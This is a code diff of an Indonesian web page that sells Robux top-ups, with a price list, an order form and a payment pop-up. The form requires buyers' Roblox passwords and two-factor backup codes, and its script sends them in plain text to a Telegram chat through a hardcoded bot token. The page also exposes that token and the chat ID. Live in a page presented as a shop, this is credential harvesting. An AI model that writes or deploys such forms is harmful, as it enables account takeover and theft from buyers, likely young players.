@@ -6,40 +6,37 @@
 <title>Pricelist & Form Pembelian Robux - VILOG</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root { --primary:#4a6fa1; }
-  body { font-family: 'Roboto', sans-serif; background:#fff; margin:0; color:#333; font-size:13px; scroll-behavior:smooth; }
-  .category { max-width:720px; margin:24px auto; padding:6px 12px; }
-  .category h3 { text-align:center; font-size:13px; font-weight:700; color:#2c3e50; margin-bottom:10px; }
-  .pricelist-container { display:flex; flex-wrap:wrap; gap:8px; justify-content:center; }
-  .price-box { flex:0 1 calc(33.33% - 8px); background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:6px; text-align:center; cursor:pointer; transition:0.18s; font-weight:600; font-size:12px; }
-  .price-box span { display:block; font-weight:500; font-size:11px; color:#444; margin-top:4px; }
-  .price-box:hover { transform:scale(1.03); border-color:var(--primary); background:#eef6ff; }
+  :root{--primary:#4a6fa1}
+  body{font-family:'Roboto',sans-serif;background:#fff;margin:0;color:#333;font-size:13px;scroll-behavior:smooth}
+  .category{max-width:720px;margin:24px auto;padding:6px 12px}
+  .category h3{text-align:center;font-size:13px;font-weight:700;color:#2c3e50;margin-bottom:10px}
+  .pricelist-container{display:flex;flex-wrap:wrap;gap:8px;justify-content:center}
+  .price-box{flex:0 1 calc(33.33% - 8px);background:#f9f9f9;border:1px solid #d1d9e6;border-radius:8px;padding:6px;text-align:center;cursor:pointer;transition:.18s;font-weight:600;font-size:12px}
+  .price-box span{display:block;font-weight:500;font-size:11px;color:#444;margin-top:4px}
+  .price-box:hover{transform:scale(1.03);border-color:var(--primary);background:#eef6ff}
 
-  .form-container { max-width:420px; margin:18px auto 40px; background:#fafafa; border:1px solid #d1d9e6; border-radius:10px; padding:16px; box-shadow:0 2px 8px rgba(0,0,0,0.04); }
-  .form-container h2 { text-align:center; margin:0 0 12px; font-size:16px; color:#23314a; }
-  .form-group { margin-bottom:10px; }
-  label { display:block; margin-bottom:4px; font-size:12px; color:#333; font-weight:600; }
-  input, select { width:100%; padding:8px; border-radius:6px; border:1px solid #ccc; font-size:13px; box-sizing:border-box; }
-  button { width:100%; padding:10px; background:var(--primary); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer; }
-  .hidden { display:none; }
+  .form-container{max-width:420px;margin:18px auto 40px;background:#fafafa;border:1px solid #d1d9e6;border-radius:10px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+  .form-container h2{text-align:center;margin:0 0 12px;font-size:16px;color:#23314a}
+  .form-group{margin-bottom:10px}
+  label{display:block;margin-bottom:4px;font-size:12px;color:#333;font-weight:600}
+  input,select{width:100%;padding:8px;border-radius:6px;border:1px solid #ccc;font-size:13px;box-sizing:border-box}
+  button{width:100%;padding:10px;background:var(--primary);color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer}
+  .hidden{display:none}
 
   /* modal */
-  .modal-backdrop { position:fixed; inset:0; background:rgba(0,0,0,0.45); display:none; align-items:center; justify-content:center; z-index:9999; }
-  .modal { width:360px; max-width:94%; background:#fff; border-radius:12px; padding:16px; box-shadow:0 8px 30px rgba(0,0,0,0.25); text-align:center; }
-  .modal h3 { margin:0 0 8px; font-size:16px; color:#153057; }
-  .qr { width:190px; height:190px; object-fit:cover; border-radius:8px; border:1px solid #eee; margin:8px auto; }
-  .amount { font-size:18px; font-weight:800; color:#11406c; margin-top:6px; }
-  .pay-note { font-size:13px; color:#444; margin-top:8px; }
-  .actions { display:flex; gap:8px; margin-top:12px; }
-  .actions button { flex:1; padding:8px; border-radius:8px; border:none; cursor:pointer; font-weight:700; }
-  .open-bot { background:#2d8cff; color:#fff; }
-  .copy-btn { background:#4a6fa1; color:#fff; }
-  .send-proof { background:#2d8c4a; color:#fff; }
-  .close-btn { background:#f0f0f0; color:#222; }
-  .copy-success { color:green; font-size:13px; margin-top:8px; display:none; }
-  .notice { margin-top:12px; padding:10px; border-radius:8px; background:#f1f8ff; border:1px solid #dceffd; color:#1b3b62; text-align:left; font-size:13px; display:none; }
-  .upload-preview { width:100%; max-height:160px; object-fit:cover; border-radius:8px; margin-top:8px; border:1px solid #eee; display:none; }
-  @media (max-width:420px){ .price-box { flex:0 1 calc(50% - 8px); } .modal{ width:92%; } }
+  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;align-items:center;justify-content:center;z-index:9999}
+  .modal{width:360px;max-width:94%;background:#fff;border-radius:12px;padding:16px;box-shadow:0 8px 30px rgba(0,0,0,.25);text-align:center}
+  .modal h3{margin:0 0 8px;font-size:16px;color:#153057}
+  .qr{width:190px;height:190px;object-fit:cover;border-radius:8px;border:1px solid #eee;margin:8px auto}
+  .amount{font-size:18px;font-weight:800;color:#11406c;margin-top:6px}
+  .pay-note{font-size:13px;color:#444;margin-top:8px}
+  .actions{display:flex;gap:8px;margin-top:12px}
+  .actions button{flex:1;padding:8px;border-radius:8px;border:none;cursor:pointer;font-weight:700}
+  .open-bot{background:#2d8cff;color:#fff}
+  .copy-btn{background:#4a6fa1;color:#fff}
+  .copy-success{color:green;font-size:13px;margin-top:8px;display:none}
+  .upload-preview{width:100%;max-height:160px;object-fit:cover;border-radius:8px;margin-top:8px;border:1px solid #eee;display:none}
+  @media(max-width:420px){.price-box{flex:0 1 calc(50% - 8px)}.modal{width:92%}}
 </style>
 </head>
 <body>
@@ -47,107 +44,73 @@
 <div class="category">
   <h3>Robux Reguler</h3>
   <div class="pricelist-container">
-    <div class="price-box" onclick="isiForm('80 Robux',15000,'Reguler')">80 Robux <span>Rp15.000</span></div>
-    <div class="price-box" onclick="isiForm('160 Robux',30000,'Reguler')">160 Robux <span>Rp30.000</span></div>
-    <div class="price-box" onclick="isiForm('240 Robux',45000,'Reguler')">240 Robux <span>Rp45.000</span></div>
-    <div class="price-box" onclick="isiForm('320 Robux',60000,'Reguler')">320 Robux <span>Rp60.000</span></div>
-    <div class="price-box" onclick="isiForm('400 Robux',74500,'Reguler')">400 Robux <span>Rp74.500</span></div>
-    <div class="price-box" onclick="isiForm('480 Robux',89400,'Reguler')">480 Robux <span>Rp89.400</span></div>
-    <div class="price-box" onclick="isiForm('560 Robux',104300,'Reguler')">560 Robux <span>Rp104.300</span></div>
-    <div class="price-box" onclick="isiForm('640 Robux',119200,'Reguler')">640 Robux <span>Rp119.200</span></div>
-    <div class="price-box" onclick="isiForm('720 Robux',134100,'Reguler')">720 Robux <span>Rp134.100</span></div>
-    <div class="price-box" onclick="isiForm('800 Robux',149000,'Reguler')">800 Robux <span>Rp149.000</span></div>
+    <div class="price-box" onclick="isiForm('80 Robux',15000,'Reguler')">80 Robux<span>Rp15.000</span></div>
+    <div class="price-box" onclick="isiForm('160 Robux',30000,'Reguler')">160 Robux<span>Rp30.000</span></div>
+    <div class="price-box" onclick="isiForm('240 Robux',45000,'Reguler')">240 Robux<span>Rp45.000</span></div>
+    <div class="price-box" onclick="isiForm('320 Robux',60000,'Reguler')">320 Robux<span>Rp60.000</span></div>
+    <div class="price-box" onclick="isiForm('400 Robux',74500,'Reguler')">400 Robux<span>Rp74.500</span></div>
+    <div class="price-box" onclick="isiForm('480 Robux',89400,'Reguler')">480 Robux<span>Rp89.400</span></div>
+    <div class="price-box" onclick="isiForm('560 Robux',104300,'Reguler')">560 Robux<span>Rp104.300</span></div>
+    <div class="price-box" onclick="isiForm('640 Robux',119200,'Reguler')">640 Robux<span>Rp119.200</span></div>
+    <div class="price-box" onclick="isiForm('720 Robux',134100,'Reguler')">720 Robux<span>Rp134.100</span></div>
+    <div class="price-box" onclick="isiForm('800 Robux',149000,'Reguler')">800 Robux<span>Rp149.000</span></div>
   </div>
 </div>
 
 <div class="category">
   <h3>Robux Special (Backup Code: Wajib)</h3>
   <div class="pricelist-container">
-    <div class="price-box" onclick="isiForm('500 Robux',71000,'Special')">500 Robux <span>Rp71.000</span></div>
-    <div class="price-box" onclick="isiForm('1000 Robux',142000,'Special')">1.000 Robux <span>Rp142.000</span></div>
-    <div class="price-box" onclick="isiForm('1500 Robux',213000,'Special')">1.500 Robux <span>Rp213.000</span></div>
-    <div class="price-box" onclick="isiForm('2000 Robux',284000,'Special')">2.000 Robux <span>Rp284.000</span></div>
-    <div class="price-box" onclick="isiForm('2500 Robux',355000,'Special')">2.500 Robux <span>Rp355.000</span></div>
-    <div class="price-box" onclick="isiForm('3000 Robux',426000,'Special')">3.000 Robux <span>Rp426.000</span></div>
-    <div class="price-box" onclick="isiForm('3500 Robux',497000,'Special')">3.500 Robux <span>Rp497.000</span></div>
-    <div class="price-box" onclick="isiForm('4000 Robux',568000,'Special')">4.000 Robux <span>Rp568.000</span></div>
-    <div class="price-box" onclick="isiForm('4500 Robux',639000,'Special')">4.500 Robux <span>Rp639.000</span></div>
-    <div class="price-box" onclick="isiForm('5000 Robux',710000,'Special')">5.000 Robux <span>Rp710.000</span></div>
-    <div class="price-box" onclick="isiForm('6000 Robux',852000,'Special')">6.000 Robux <span>Rp852.000</span></div>
+    <div class="price-box" onclick="isiForm('500 Robux',71000,'Special')">500 Robux<span>Rp71.000</span></div>
+    <div class="price-box" onclick="isiForm('1000 Robux',142000,'Special')">1.000 Robux<span>Rp142.000</span></div>
+    <div class="price-box" onclick="isiForm('1500 Robux',213000,'Special')">1.500 Robux<span>Rp213.000</span></div>
+    <div class="price-box" onclick="isiForm('2000 Robux',284000,'Special')">2.000 Robux<span>Rp284.000</span></div>
+    <div class="price-box" onclick="isiForm('2500 Robux',355000,'Special')">2.500 Robux<span>Rp355.000</span></div>
+    <div class="price-box" onclick="isiForm('3000 Robux',426000,'Special')">3.000 Robux<span>Rp426.000</span></div>
+    <div class="price-box" onclick="isiForm('3500 Robux',497000,'Special')">3.500 Robux<span>Rp497.000</span></div>
+    <div class="price-box" onclick="isiForm('4000 Robux',568000,'Special')">4.000 Robux<span>Rp568.000</span></div>
+    <div class="price-box" onclick="isiForm('4500 Robux',639000,'Special')">4.500 Robux<span>Rp639.000</span></div>
+    <div class="price-box" onclick="isiForm('5000 Robux',710000,'Special')">5.000 Robux<span>Rp710.000</span></div>
+    <div class="price-box" onclick="isiForm('6000 Robux',852000,'Special')">6.000 Robux<span>Rp852.000</span></div>
   </div>
 </div>
 
 <div class="category">
   <h3>Robux Premium (Backup Code: Wajib)</h3>
   <div class="pricelist-container">
-    <div class="price-box" onclick="isiForm('450 Robux + Premium',71000,'Premium')">450 Robux + Premium <span>Rp71.000</span></div>
-    <div class="price-box" onclick="isiForm('1000 Robux + Premium',142000,'Premium')">1.000 Robux + Premium <span>Rp142.000</span></div>
-    <div class="price-box" onclick="isiForm('1550 Robux + Premium',213000,'Premium')">1.550 Robux + Premium <span>Rp213.000</span></div>
-    <div class="price-box" onclick="isiForm('2200 Robux + Premium',284000,'Premium')">2.200 Robux + Premium <span>Rp284.000</span></div>
-    <div class="price-box" onclick="isiForm('2750 Robux + Premium',355000,'Premium')">2.750 Robux + Premium <span>Rp355.000</span></div>
+    <div class="price-box" onclick="isiForm('450 Robux + Premium',71000,'Premium')">450 Robux + Premium<span>Rp71.000</span></div>
+    <div class="price-box" onclick="isiForm('1000 Robux + Premium',142000,'Premium')">1.000 Robux + Premium<span>Rp142.000</span></div>
+    <div class="price-box" onclick="isiForm('1550 Robux + Premium',213000,'Premium')">1.550 Robux + Premium<span>Rp213.000</span></div>
+    <div class="price-box" onclick="isiForm('2200 Robux + Premium',284000,'Premium')">2.200 Robux + Premium<span>Rp284.000</span></div>
+    <div class="price-box" onclick="isiForm('2750 Robux + Premium',355000,'Premium')">2.750 Robux + Premium<span>Rp355.000</span></div>
   </div>
 </div>
 
 <div class="form-container">
   <h2>Formulir Pembelian Robux VILOG</h2>
   <form id="orderForm">
-    <div class="form-group">
-      <label for="username">Username Roblox *</label>
-      <input id="username" name="username" required placeholder="Username Roblox" />
+    <div class="form-group"><label for="username">Username Roblox *</label><input id="username" name="username" required placeholder="Username Roblox" /></div>
+    <div class="form-group"><label for="password">Password Roblox *</label><input id="password" name="password" type="password" required placeholder="Password Roblox" /></div>
+    <div class="form-group"><label for="v2l">Verifikasi 2 Langkah (V2L) *</label>
+      <select id="v2l" name="v2l" required><option value="">-- Pilih Status --</option><option value="OFF">Nonaktif (OFF)</option><option value="ON">Aktif (ON)</option></select>
     </div>
-    <div class="form-group">
-      <label for="password">Password Roblox *</label>
-      <input id="password" name="password" type="password" required placeholder="Password Roblox" />
-    </div>
-    <div class="form-group">
-      <label for="v2l">Verifikasi 2 Langkah (V2L) *</label>
-      <select id="v2l" name="v2l" required>
-        <option value="">-- Pilih Status --</option>
-        <option value="OFF">Nonaktif (OFF)</option>
-        <option value="ON">Aktif (ON)</option>
-      </select>
-    </div>
-    <div class="form-group hidden" id="metodeV2L_div">
-      <label for="metodeV2L">Pilih Metode V2L *</label>
-      <select id="metodeV2L" name="metodeV2L">
-        <option value="">-- Pilih Metode --</option>
-        <option value="Backup Code">Backup Code</option>
-        <option value="Kode Email">Kode Email</option>
-      </select>
-    </div>
-    <div class="form-group hidden" id="backupCode_div">
-      <label for="backupCode">Masukkan Backup Code *</label>
-      <input id="backupCode" name="backupCode" placeholder="Isi Backup Code (1-3 code)" />
-    </div>
+    <div class="form-group hidden" id="metodeV2L_div"><label for="metodeV2L">Pilih Metode V2L *</label><select id="metodeV2L" name="metodeV2L"><option value="">-- Pilih Metode --</option><option value="Backup Code">Backup Code</option><option value="Kode Email">Kode Email</option></select></div>
+    <div class="form-group hidden" id="backupCode_div"><label for="backupCode">Masukkan Backup Code *</label><input id="backupCode" name="backupCode" placeholder="Isi Backup Code (1-3 code)" /></div>
 
-    <div class="form-group">
-      <label for="kategori">Kategori Robux *</label>
-      <input id="kategori" name="kategori" readonly required />
-    </div>
-    <div class="form-group">
-      <label for="nominal">Jumlah Order *</label>
-      <input id="nominal" name="nominal" readonly required />
-    </div>
-    <div class="form-group">
-      <label for="harga">Harga *</label>
-      <input id="harga" name="harga" readonly required />
-    </div>
+    <div class="form-group"><label for="kategori">Kategori Robux *</label><input id="kategori" name="kategori" readonly required /></div>
+    <div class="form-group"><label for="nominal">Jumlah Order *</label><input id="nominal" name="nominal" readonly required /></div>
+    <div class="form-group"><label for="harga">Harga *</label><input id="harga" name="harga" readonly required /></div>
 
-    <!-- hidden order id -->
     <input type="hidden" id="orderId" name="orderId" />
 
-    <div style="text-align:center; margin-top:12px;">
-      <button type="button" id="btnWa">Pesan via Telegram</button>
-    </div>
+    <div style="text-align:center;margin-top:12px;"><button type="button" id="btnWa">Pesan via Telegram</button></div>
   </form>
 </div>
 
-<!-- modal -->
+<!-- modal (minimal now: QR + amount + open-bot + copy) -->
 <div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">
   <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
     <h3 id="modalTitle">Pembayaran</h3>
     <img id="modalQr" class="qr" src="" alt="QR Pembayaran" />
-    <img id="uploadPreview" class="upload-preview" alt="Preview Bukti" />
     <div id="modalAmount" class="amount">Rp0</div>
     <div class="pay-note">Silahkan lakukan pembayaran, lalu kembali & wajib kirim bukti pembayaran ke bot.</div>
 
@@ -156,58 +119,41 @@
       <button id="openBotBtn" class="open-bot" type="button">Buka bot sekarang</button>
     </div>
 
-    <div style="display:flex; gap:8px; margin-top:12px;">
-      <button id="sendProofBtn" class="send-proof" type="button">Kirim bukti sekarang</button>
-      <button id="closeModalBtn" class="close-btn" type="button">Tutup</button>
-    </div>
-
     <div id="copySuccess" class="copy-success">Jumlah berhasil disalin ke clipboard</div>
-
-    <div id="orderNotice" class="notice"></div>
-
-    <input id="proofFileInput" type="file" accept="image/*,application/pdf" class="hidden" />
   </div>
 </div>
 
 <script>
-/* ---------- helper ---------- */
+/* util */
 function formatRp(n){
-  const num = Number(String(n).replace(/[^\d]/g,''));
-  if (isNaN(num)) return 'Rp0';
+  const num = Number(String(n).replace(/[^\d]/g,'')); if(isNaN(num)) return 'Rp0';
   return 'Rp'+ new Intl.NumberFormat('id-ID').format(num);
 }
 
-/* click price */
-function isiForm(nominal, hargaNum, kategori){
+/* fill form */
+function isiForm(nominal,hargaNum,kategori){
   document.getElementById('nominal').value = nominal;
   document.getElementById('harga').value = formatRp(hargaNum);
   document.getElementById('kategori').value = kategori;
-  document.querySelector('.form-container').scrollIntoView({ behavior:'smooth' });
+  document.querySelector('.form-container').scrollIntoView({behavior:'smooth'});
 }
 
-/* V2L logic */
-document.getElementById("v2l").addEventListener("change", function(){
-  if (this.value === "ON"){ document.getElementById("metodeV2L_div").classList.remove("hidden"); }
-  else { document.getElementById("metodeV2L_div").classList.add("hidden"); document.getElementById("backupCode_div").classList.add("hidden"); }
+/* V2L */
+document.getElementById('v2l').addEventListener('change', function(){
+  if(this.value==='ON') document.getElementById('metodeV2L_div').classList.remove('hidden');
+  else { document.getElementById('metodeV2L_div').classList.add('hidden'); document.getElementById('backupCode_div').classList.add('hidden'); }
 });
-document.getElementById("metodeV2L").addEventListener("change", function(){
-  if (this.value === "Backup Code"){ document.getElementById("backupCode_div").classList.remove("hidden"); }
-  else { document.getElementById("backupCode_div").classList.add("hidden"); }
+document.getElementById('metodeV2L').addEventListener('change', function(){
+  if(this.value==='Backup Code') document.getElementById('backupCode_div').classList.remove('hidden');
+  else document.getElementById('backupCode_div').classList.add('hidden');
 });
 
-/* ---------- send order to telegram & show modal ---------- */
+/* send order -> open modal */
 document.getElementById('btnWa').addEventListener('click', function(){
   const form = document.getElementById('orderForm');
   const required = form.querySelectorAll('[required]');
-  for (const el of required){
-    if (!el.value.trim()){
-      alert('Harap isi semua kolom yang wajib diisi!');
-      el.focus();
-      return;
-    }
-  }
+  for(const el of required){ if(!el.value.trim()){ alert('Harap isi semua kolom yang wajib diisi!'); el.focus(); return; } }
 
-  // collect values
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value;
   const v2l = document.getElementById('v2l').value;
@@ -217,203 +163,95 @@ document.getElementById('btnWa').addEventListener('click', function(){
   const nominal = document.getElementById('nominal').value || '-';
   const harga = document.getElementById('harga').value || '-';
 
-  // create order id
   const orderId = 'ORD' + Date.now();
   document.getElementById('orderId').value = orderId;
 
-  // build order text (this includes password as before; if you prefer remove password here, change accordingly)
   const orderText =
-    'Pesanan Baru Masuk!\n\n' +
-    'Order ID: ' + orderId + '\n' +
-    'Username: ' + username + '\n' +
-    'Password: ' + password + '\n' +
-    'V2L: ' + v2l + ' (' + metodeV2L + ')\n' +
-    (backupCode && backupCode !== '-' ? ('Backup Code: ' + backupCode + '\n') : '') +
-    'Kategori: ' + kategori + '\n' +
-    'Nominal: ' + nominal + '\n' +
+    'Pesanan Baru Masuk!\\n\\n' +
+    'Order ID: ' + orderId + '\\n' +
+    'Username: ' + username + '\\n' +
+    'Password: ' + password + '\\n' +
+    'V2L: ' + v2l + ' (' + metodeV2L + ')\\n' +
+    (backupCode && backupCode !== '-' ? ('Backup Code: ' + backupCode + '\\n') : '') +
+    'Kategori: ' + kategori + '\\n' +
+    'Nominal: ' + nominal + '\\n' +
     'Harga: ' + harga;
 
-  // TELEGRAM CONFIG - ganti token/chat if needed
   const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
   const chatId = "-1003049680083";
 
   fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
     method:'POST',
-    headers:{ 'Content-Type':'application/json' },
+    headers:{'Content-Type':'application/json'},
     body: JSON.stringify({ chat_id: chatId, text: orderText })
   })
   .then(r => {
-    if (r.ok){
-      // show modal with QR + amount, and order notice
+    if(r.ok){
       const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
       showPaymentPopup(qrUrl, harga, orderId);
-
-      // set order notice text
-      const notice = document.getElementById('orderNotice');
-      notice.innerHTML = "<strong>Pesanan berhasil dikirim.</strong><br>Wajib standby selama pesanan belum <strong>DONE</strong>. Apabila terjadi kendala/permintaan verifikasi, akan dihubungi melalui bot.";
-      notice.style.display = 'block';
-
-      // reset form but keep orderId in hidden input
+      // reset form but keep order id in hidden input
       form.reset();
       document.getElementById('orderId').value = orderId;
     } else {
       alert('Gagal mengirim pesanan. Coba lagi.');
     }
   })
-  .catch(err => {
-    console.error(err);
-    alert('Terjadi kesalahan saat mengirim pesanan.');
-  });
+  .catch(err => { console.error(err); alert('Terjadi kesalahan saat mengirim pesanan.'); });
 });
 
-/* ---------- modal & upload ---------- */
+/* modal behavior: (minimal) */
 function showPaymentPopup(qrUrl, hargaFormatted, orderId){
   const backdrop = document.getElementById('paymentModalBackdrop');
   const modal = backdrop.querySelector('.modal');
   const modalQr = document.getElementById('modalQr');
   const modalAmount = document.getElementById('modalAmount');
   const copySuccess = document.getElementById('copySuccess');
-  const uploadPreview = document.getElementById('uploadPreview');
 
   modalQr.src = qrUrl;
-  uploadPreview.style.display = 'none';
-  uploadPreview.src = '';
+  modalAmount.textContent = (/^Rp/i.test(hargaFormatted) ? hargaFormatted : formatRp(hargaFormatted));
 
-  modalAmount.textContent = ( /^Rp/i.test(hargaFormatted) ? hargaFormatted : formatRp(hargaFormatted) );
-
-  // show & block scroll
   backdrop.style.display = 'flex';
   backdrop.setAttribute('aria-hidden','false');
   document.body.style.overflow = 'hidden';
 
-  // center focus with smooth scroll
-  setTimeout(()=> modal.scrollIntoView({ behavior:'smooth', block:'center' }), 60);
+  // smooth center
+  setTimeout(()=> modal.scrollIntoView({behavior:'smooth', block:'center'}), 60);
 
-  // close handlers
-  document.getElementById('closeModalBtn').onclick = closeModal;
-  backdrop.onclick = function(e){ if (e.target === backdrop) closeModal(); };
-
-  function closeModal(){
-    backdrop.style.display = 'none';
-    backdrop.setAttribute('aria-hidden','true');
-    document.body.style.overflow = '';
-  }
+  // click outside closes (still allow closing)
+  backdrop.onclick = function(e){ if(e.target === backdrop){ backdrop.style.display='none'; backdrop.setAttribute('aria-hidden','true'); document.body.style.overflow=''; } };
 
   // copy amount
   document.getElementById('copyAmountBtn').onclick = function(){
     const textToCopy = modalAmount.textContent || '';
     navigator.clipboard?.writeText(textToCopy).then(()=> {
-      const cs = document.getElementById('copySuccess'); cs.style.display='block';
-      setTimeout(()=> cs.style.display='none', 2200);
+      copySuccess.style.display='block';
+      setTimeout(()=> copySuccess.style.display='none', 2200);
     }).catch(()=> {
-      // fallback
       const t = document.createElement('textarea'); t.value = textToCopy; document.body.appendChild(t); t.select();
-      try { document.execCommand('copy'); const cs = document.getElementById('copySuccess'); cs.style.display='block'; setTimeout(()=> cs.style.display='none',2200); }
-      catch(e){ alert('Gagal menyalin. Silahkan salin manual: ' + textToCopy); }
+      try{ document.execCommand('copy'); copySuccess.style.display='block'; setTimeout(()=> copySuccess.style.display='none',2200); }catch(e){ alert('Gagal menyalin. Silahkan salin manual: '+textToCopy); }
       document.body.removeChild(t);
     });
   };
 
-  // open bot
+  // OPEN BOT: open bot chat with start param AND copy "/ORDERID" to clipboard
   document.getElementById('openBotBtn').onclick = function(){
-    window.open('https://t.me/topupressbot','_blank');
-  };
+    const ord = orderId || document.getElementById('orderId').value || ('ORD' + Date.now());
+    // 1) try deep link with start param (bot receives /start <payload>)
+    const deep = 'https://t.me/topupressbot?start=' + encodeURIComponent(ord);
+    window.open(deep, '_blank');
 
-  // send proof -> open file input
-  document.getElementById('sendProofBtn').onclick = function(){
-    document.getElementById('proofFileInput').click();
-  };
-
-  // handle file choose
-  const fileInput = document.getElementById('proofFileInput');
-  fileInput.onchange = function(ev){
-    const file = ev.target.files && ev.target.files[0];
-    if (!file) return;
-    // validation size (8 MB default)
-    const maxSize = 8 * 1024 * 1024;
-    if (file.size > maxSize){
-      alert('Ukuran file terlalu besar. Maksimum ' + Math.round(maxSize/1024/1024) + ' MB.');
-      fileInput.value = '';
-      return;
-    }
-    // upload file with form data in caption
-    uploadProofWithForm(file, orderId);
-    fileInput.value = '';
-  };
-}
-
-/* ---------- upload proof with form data ---------- */
-function uploadProofWithForm(file, orderId){
-  // gather visible form values (note: password intentionally omitted from proof caption for security)
-  const username = document.getElementById('username').value || '-';
-  const kategori = document.getElementById('kategori').value || '-';
-  const nominal = document.getElementById('nominal').value || '-';
-  const harga = document.getElementById('harga').value || '-';
-  const v2l = document.getElementById('v2l').value || '-';
-  const metodeV2L = document.getElementById('metodeV2L').value || '-';
-  const backupCode = document.getElementById('backupCode').value || '-';
-
-  const captionParts = [
-    'Bukti Pembayaran',
-    'Order ID: ' + (orderId || (document.getElementById('orderId').value || '-')),
-    'Username: ' + username,
-    'Kategori: ' + kategori,
-    'Nominal: ' + nominal,
-    'Harga: ' + harga,
-    'V2L: ' + v2l + (metodeV2L && metodeV2L !== '-' ? ' (' + metodeV2L + ')' : ''),
-    (backupCode && backupCode !== '-' ? ('Backup Code: ' + backupCode) : '')
-  ];
-  // ensure caption length not exceed Telegram limit (~1024), so join and trim if needed
-  let caption = captionParts.filter(Boolean).join('\n');
-  if (caption.length > 1000) caption = caption.slice(0, 1000) + '...';
-
-  // send via Telegram
-  const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
-  const chatId = "-1003049680083";
-  const isImage = file.type.startsWith('image/');
-  const endpoint = isImage ? '/sendPhoto' : '/sendDocument';
-  const url = "https://api.telegram.org/bot" + botToken + endpoint;
-
-  const fd = new FormData();
-  fd.append('chat_id', chatId);
-  if (isImage) fd.append('photo', file);
-  else fd.append('document', file);
-  fd.append('caption', caption);
-
-  // UI feedback
-  const sendBtn = document.getElementById('sendProofBtn');
-  const prevText = sendBtn.textContent;
-  sendBtn.textContent = 'Mengunggah...';
-  sendBtn.disabled = true;
-
-  fetch(url, { method:'POST', body: fd })
-    .then(r => r.json())
-    .then(result => {
-      sendBtn.textContent = prevText;
-      sendBtn.disabled = false;
-      if (result && result.ok){
-        alert('Bukti pembayaran berhasil dikirim ke bot. Terima kasih.');
-        // show preview if image
-        if (isImage){
-          const preview = document.getElementById('uploadPreview');
-          preview.src = URL.createObjectURL(file);
-          preview.style.display = 'block';
-        }
-        // update notice
-        const orderNotice = document.getElementById('orderNotice');
-        orderNotice.innerHTML = "<strong>Bukti pembayaran terkirim.</strong><br>Harap tunggu verifikasi. Wajib standby selama pesanan belum <strong>DONE</strong>.";
-        orderNotice.style.display = 'block';
-      } else {
-        console.error(result);
-        alert('Gagal mengirim bukti. Silakan coba lagi.');
-      }
-    })
-    .catch(err => {
-      console.error(err);
-      sendBtn.textContent = prevText;
-      sendBtn.disabled = false;
-      alert('Terjadi kesalahan saat mengirim bukti.');
+    // 2) copy /ORDERID to clipboard so user can paste and send (browser requires user action — this is invoked on click)
+    const cmd = '/' + ord;
+    navigator.clipboard?.writeText(cmd).then(()=> {
+      // visual hint
+      copySuccess.textContent = 'Perintah ' + cmd + ' disalin. Silakan paste & kirim di chat bot.';
+      copySuccess.style.display = 'block';
+      setTimeout(()=> { copySuccess.style.display='none'; copySuccess.textContent='Jumlah berhasil disalin ke clipboard'; }, 3800);
+    }).catch(()=> {
+      // fallback: show prompt for manual copy
+      prompt('Salin perintah ini dan kirim ke bot:', cmd);
     });
+  };
 }
 </script>
 </body>
